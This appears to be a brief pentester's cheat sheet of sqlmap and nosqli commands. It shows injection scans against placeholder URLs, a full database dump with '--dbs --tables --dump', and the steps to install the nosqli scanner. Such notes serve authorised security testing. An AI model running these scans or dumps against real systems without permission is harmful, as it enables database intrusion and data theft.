
## **SqlMap**

simple
```bash
sqlmap -u "http://target.com/page?id=1"
```

```bash
sqlmap -u "http://target.com/login" --data="username=admin&password=test"
```

```bash
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"
```

full
```bash
sqlmap -u "http://target.com/page?id=1" --dbs --tables --dump
```

```bash
sqlmap -u "http://target.com/page?id=1" --dbms=postgresql
```

```bash
sqlmap -u "http://target.com/page?id=1" --proxy=http://127.0.0.1:8080
```



## **NoSqlMap**

Установка
```bash
git clone https://github.com/Charlie-belmer/nosqli.git
cd nosqli
./build.sh
go install
```

```bash
nosqli scan -t http://localhost:4000/user/lookup?username=test
```





